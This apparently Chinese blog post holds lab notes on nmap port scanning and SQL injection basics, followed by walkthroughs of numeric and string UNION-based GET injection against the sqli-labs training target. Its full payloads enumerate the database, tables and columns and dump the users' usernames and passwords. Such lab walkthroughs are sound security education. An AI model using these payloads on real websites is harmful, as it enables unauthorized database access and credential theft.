+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110192606406.png" alt="image-20251110192606406" data-caption="image-20251110192606406" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110192830120.png" alt="image-20251110192830120" data-caption="image-20251110192830120" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110193109443.png" alt="image-20251110193109443" data-caption="image-20251110193109443" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110193135926.png" alt="image-20251110193135926" data-caption="image-20251110193135926" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110193731886.png" alt="image-20251110193731886" data-caption="image-20251110193731886" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110193859603.png" alt="image-20251110193859603" data-caption="image-20251110193859603" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110193955697.png" alt="image-20251110193955697" data-caption="image-20251110193955697" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194036233.png" alt="image-20251110194036233" data-caption="image-20251110194036233" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194212281.png" alt="image-20251110194212281" data-caption="image-20251110194212281" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194300619.png" alt="image-20251110194300619" data-caption="image-20251110194300619" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194400118.png" alt="image-20251110194400118" data-caption="image-20251110194400118" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194708672.png" alt="image-20251110194708672" data-caption="image-20251110194708672" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110194728843.png" alt="image-20251110194728843" data-caption="image-20251110194728843" loading="lazy"></p>
+<p>nmap+ip只会查找这个ip开放的常见默认的端口，所以把mysql默认的端口3306改成3308之后，再用这个指令去扫描开放的端口的话就会扫描不到</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110195221077.png" alt="image-20251110195221077" data-caption="image-20251110195221077" loading="lazy"></p>
+<p>如果加全端口扫描的话就会把修改的mysql的端口就会被扫描到，端口可以扫描到，但是服务却扫描的不是mysql服务</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110200645475.png" alt="image-20251110200645475" data-caption="image-20251110200645475" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110200659305.png" alt="image-20251110200659305" data-caption="image-20251110200659305" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110200936146.png" alt="image-20251110200936146" data-caption="image-20251110200936146" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110201008705.png" alt="image-20251110201008705" data-caption="image-20251110201008705" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110201135554.png" alt="image-20251110201135554" data-caption="image-20251110201135554" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110201430127.png" alt="image-20251110201430127" data-caption="image-20251110201430127" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110201546386.png" alt="image-20251110201546386" data-caption="image-20251110201546386" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110203129900.png" alt="image-20251110203129900" data-caption="image-20251110203129900" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110203358048.png" alt="image-20251110203358048" data-caption="image-20251110203358048" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251110203456795.png" alt="image-20251110203456795" data-caption="image-20251110203456795" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111203600572.png" alt="image-20251111203600572" data-caption="image-20251111203600572" loading="lazy"></p>
+<p>mysql 对大小写不敏感所以大小写皆可</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111204851138.png" alt="image-20251111204851138" data-caption="image-20251111204851138" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111204932611.png" alt="image-20251111204932611" data-caption="image-20251111204932611" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111205523338.png" alt="image-20251111205523338" data-caption="image-20251111205523338" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111205913407.png" alt="image-20251111205913407" data-caption="image-20251111205913407" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111210010301.png" alt="image-20251111210010301" data-caption="image-20251111210010301" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111210203084.png" alt="image-20251111210203084" data-caption="image-20251111210203084" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251111210631350.png" alt="image-20251111210631350" data-caption="image-20251111210631350" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112103000567.png" alt="image-20251112103000567" data-caption="image-20251112103000567" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112103208910.png" alt="image-20251112103208910" data-caption="image-20251112103208910" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112103325281.png" alt="image-20251112103325281" data-caption="image-20251112103325281" loading="lazy"></p>
+<p>union查询的前后字段数要一样，不然的话就会像上面这样报错</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112103529766.png" alt="image-20251112103529766" data-caption="image-20251112103529766" loading="lazy"></p>
+<p>下面这个顾名思义就是用返回的true跟false来确定表名</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112103924206.png" alt="image-20251112103924206" data-caption="image-20251112103924206" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112105549293.png" alt="image-20251112105549293" data-caption="image-20251112105549293" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112110640439.png" alt="image-20251112110640439" data-caption="image-20251112110640439" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112111420221.png" alt="image-20251112111420221" data-caption="image-20251112111420221" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112111830921.png" alt="image-20251112111830921" data-caption="image-20251112111830921" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112114551950.png" alt="image-20251112114551950" data-caption="image-20251112114551950" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112115606589.png" alt="image-20251112115606589" data-caption="image-20251112115606589" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select c1,c2,...,cn from result order by M;</span><br></pre></td></tr></table></figure>
+
+<p>order by后面的数字（M）必须小于或等于n（数据库查询的字段数），才能正常显示。如果M&gt;n，数据库就会报错。可以利用这个特点判断数据库查询的字段数。</p>
+<h4 id="2．limit的用法"><a href="#2．limit的用法" class="headerlink" title="2．limit的用法"></a>2．limit的用法</h4><p>基本格式为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">limit M,N</span><br><span class="line">//表示从第M+1条数据开始，顺序往下查询N条数据</span><br><span class="line"></span><br><span class="line">limit M</span><br><span class="line">//表示查询前M条数据</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select c1,c2,...,cn from result union select d1,d2,...dm;</span><br></pre></td></tr></table></figure>
+
+<p>后半句union select查询的字段数（m）必须与前半句select查询的字段数（n）相等，数据库才能正常显示结果。与order by相似，可以利用这个特点判断数据库查询的字段数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,city from result where id=1 and 1=2 union select name,score from result;</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112152831336.png" alt="image-20251112152831336" data-caption="image-20251112152831336" loading="lazy"></p>
+<p>从以上结果可以总结，在已知字段名的情况下，攻击者只要将该字段置于任何能够显示的位置，就可以暴露该字段的值。</p>
+<p>MySQL（MariaDB）5.5以上版本自带information_schema数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名、数据库的表、表栏的数据类型与访问权限等。可以把information_schema数据库看作MySQL（MariaDB）的“目录”！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">select schema_name from information_schema.schemata; </span><br></pre></td></tr></table></figure>
+
+<p>两条语句执行结果相同！</p>
+<p>第一组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use student;</span><br><span class="line"></span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p>第二组：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;student&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>两条语句执行结果相同！</p>
+<h1 id="SQL注入-基于联合查询的数字型GET注入"><a href="#SQL注入-基于联合查询的数字型GET注入" class="headerlink" title="SQL注入-基于联合查询的数字型GET注入"></a>SQL注入-基于联合查询的数字型GET注入</h1><h2 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h2><p>数字型GET注入，其注入点存在于URL中的GET参数处，如<a target="_blank" rel="noopener" href="http://www.testweb.com/user.php?id=8%EF%BC%8C%E8%80%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E7%AB%AF%E5%AE%9E%E9%99%85%E6%9F%A5%E8%AF%A2%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9E%8B%E8%AF%B8%E5%A6%82%EF%BC%9A%E2%80%9Cselect">http://www.testweb.com/user.php?id=8，而服务器后端实际查询代码原型诸如：“select</a> … from … where id&#x3D;$id…” 。<br>攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息</p>
+<h4 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>分别使用以下3条payload寻找注入点及判断注入点的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>运行后报错！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=1</span><br></pre></td></tr></table></figure>
+
+<p>运行后正常显示！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p>运行后未正常显示！</p>
+<p>由上述结果可以判断，网站存在数字型注入点。</p>
+<h4 id="判断网站查询的字段数"><a href="#判断网站查询的字段数" class="headerlink" title="判断网站查询的字段数"></a>判断网站查询的字段数</h4><p>尝试使用以下payload获取网站查询的字段数（关键字order by）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 1--+</span><br></pre></td></tr></table></figure>
+
+<p>正常显示！</p>
+<p>判断网站查询的字段数</p>
+<p>尝试使用以下payload获取网站查询的字段数（关键字order by）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 2--+</span><br></pre></td></tr></table></figure>
+
+<p>正常显示！</p>
+<p>判断网站查询的字段数</p>
+<p>尝试使用以下payload获取网站查询的字段数（关键字order by）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 3--+</span><br></pre></td></tr></table></figure>
+
+<p>正常显示！</p>
+<p>判断网站查询的字段数</p>
+<p>尝试使用以下payload获取网站查询的字段数（关键字order by）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p>报错！</p>
+<p>由上述结果可以判断，网站查询的字段数为3。</p>
+<h4 id="判断网站的回显位置"><a href="#判断网站的回显位置" class="headerlink" title="判断网站的回显位置"></a>判断网站的回显位置</h4><p>利用以下payload判断网站的回显位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>执行的结果是：2号位和3号位可以回显！</p>
+<p>后面的步骤中，我们可以在2号位或3号位设置一些具有特殊功能的函数或命令来执行SQL注入！</p>
+<h4 id="获取网站当前所在数据库的库名"><a href="#获取网站当前所在数据库的库名" class="headerlink" title="获取网站当前所在数据库的库名"></a>获取网站当前所在数据库的库名</h4><p>使用以下payload获取网站当前所在数据库的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为security。</p>
+<h4 id="获取数据库security的全部表名"><a href="#获取数据库security的全部表名" class="headerlink" title="获取数据库security的全部表名"></a>获取数据库security的全部表名</h4><p>使用以下payload获取数据库security的全部表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。</p>
+<h4 id="获取users表的全部字段名"><a href="#获取users表的全部字段名" class="headerlink" title="获取users表的全部字段名"></a>获取users表的全部字段名</h4><p>使用以下payload获取users表的全部字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果，users表中有id、username和password三个字段。</p>
+<h4 id="获取users表id、username和password字段的全部值。"><a href="#获取users表id、username和password字段的全部值。" class="headerlink" title="获取users表id、username和password字段的全部值。"></a>获取users表id、username和password字段的全部值。</h4><p>由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如</p>
+<p>（1）显示第1组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Dump，Dump。</p>
+<p>（2）显示第2组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-2/?id=1 and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Angelina，I-kill-you。</p>
+<p>以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。</p>
+<h1 id="SQL注入-基于联合查询的字符型GET注入"><a href="#SQL注入-基于联合查询的字符型GET注入" class="headerlink" title="SQL注入-基于联合查询的字符型GET注入"></a>SQL注入-基于联合查询的字符型GET注入</h1><h2 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h2><p>字符型GET注入，其注入点存在于URL中的GET参数处，如<a target="_blank" rel="noopener" href="http://www.testweb.com/user.php?id=admin%EF%BC%8C%E8%80%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%8E%E7%AB%AF%E5%AE%9E%E9%99%85%E6%9F%A5%E8%AF%A2%E4%BB%A3%E7%A0%81%E5%8E%9F%E5%9E%8B%E8%AF%B8%E5%A6%82%EF%BC%9A%E2%80%9Cselect">http://www.testweb.com/user.php?id=admin，而服务器后端实际查询代码原型诸如：“select</a> … from … where id&#x3D;’$id’…” 。<br>攻击者可以通过构造恶意的GET输入参数，利用union select命令进行注入，暴露数据库中存储的信息。</p>
+<h4 id="寻找注入点-1"><a href="#寻找注入点-1" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>分别使用以下3条payload寻找注入点及判断注入点的类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>运行后报错！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>运行后正常显示！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p>运行后未正常显示！</p>
+<p>由上述结果可以判断，网站存在字符型注入点。</p>
+<h4 id="判断网站查询的字段数-1"><a href="#判断网站查询的字段数-1" class="headerlink" title="判断网站查询的字段数"></a>判断网站查询的字段数</h4><p>尝试使用以下payload获取网站查询的字段数（关键字order by）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 1--+</span><br></pre></td></tr></table></figure>
+
+<p>正常显示！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; order by 4--+</span><br></pre></td></tr></table></figure>
+
+<p>报错！</p>
+<p>由上述结果可以判断，网站查询的字段数为3。</p>
+<h4 id="判断网站的回显位置-1"><a href="#判断网站的回显位置-1" class="headerlink" title="判断网站的回显位置"></a>判断网站的回显位置</h4><p>利用以下payload判断网站的回显位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
+<p>执行的结果是：2号位和3号位可以回显！</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/../imgs/$%7Bfiilename%7D/image-20251112215405494.png" alt="image-20251112215405494" data-caption="image-20251112215405494" loading="lazy"></p>
+<h4 id="获取网站当前所在数据库的库名-1"><a href="#获取网站当前所在数据库的库名-1" class="headerlink" title="获取网站当前所在数据库的库名"></a>获取网站当前所在数据库的库名</h4><p>使用以下payload获取网站当前所在数据库的库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为security。</p>
+<h4 id="获取数据库security的全部表名-1"><a href="#获取数据库security的全部表名-1" class="headerlink" title="获取数据库security的全部表名"></a>获取数据库security的全部表名</h4><p>使用以下payload获取数据库security的全部表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果中，有一个名为users的表，这当中可能存放着网站用户的基本信息。</p>
+<h4 id="获取users表的全部字段名-1"><a href="#获取users表的全部字段名-1" class="headerlink" title="获取users表的全部字段名"></a>获取users表的全部字段名</h4><p>使用以下payload获取users表的全部字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果，users表中有id、username和password三个字段。</p>
+<h4 id="获取users表id、username和password字段的全部值。-1"><a href="#获取users表id、username和password字段的全部值。-1" class="headerlink" title="获取users表id、username和password字段的全部值。"></a>获取users表id、username和password字段的全部值。</h4><p>由于users表中存放着多组用户名和密码的数据，而每次只能显示一组数据，我们可以通过limit M,N的方式逐条显示，如</p>
+<p>（1）显示第1组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 0,1--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Dump，Dump。</p>
+<p>（2）显示第2组数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(&#x27;,&#x27;,id,username,password) from security.users limit 1,1--+</span><br></pre></td></tr></table></figure>
+
+<p>显示结果为Angelina，I-kill-you。</p>
+<p>以此类推，可通过修改limit后面的参数，将users表中存放的所有用户信息全部暴露出来。<br>实验至此结束。</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1765183933821"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#2%EF%BC%8Elimit%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">2．limit的用法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E6%95%B0%E5%AD%97%E5%9E%8BGET%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">SQL注入-基于联合查询的数字型GET注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number"></span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">判断网站查询的字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E7%BD%91%E7%AB%99%E7%9A%84%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">3.</span> <span class="toc-text">判断网站的回显位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BD%91%E7%AB%99%E5%BD%93%E5%89%8D%E6%89%80%E5%9C%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%BA%93%E5%90%8D"><span class="toc-number">4.</span> <span class="toc-text">获取网站当前所在数据库的库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93security%E7%9A%84%E5%85%A8%E9%83%A8%E8%A1%A8%E5%90%8D"><span class="toc-number">5.</span> <span class="toc-text">获取数据库security的全部表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8%E7%9A%84%E5%85%A8%E9%83%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text">获取users表的全部字段名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96users%E8%A1%A8id%E3%80%81username%E5%92%8Cpassword%E5%AD%97%E6%AE%B5%E7%9A%84%E5%85%A8%E9%83%A8%E5%80%BC%E3%80%82"><span class="toc-number">7.</span> <span class="toc-text">获取users表id、username和password字段的全部值。</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8BGET%E6%B3%A8%E5%85%A5"><span class="toc-number"></span> <span class="toc-text">SQL注入-基于联合查询的字符型GET注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86-1"><span class="toc-number"></span> <span class="toc-text">实验原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9-1"><span class="toc-number">1.</span> <span class="toc-text">寻找注入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 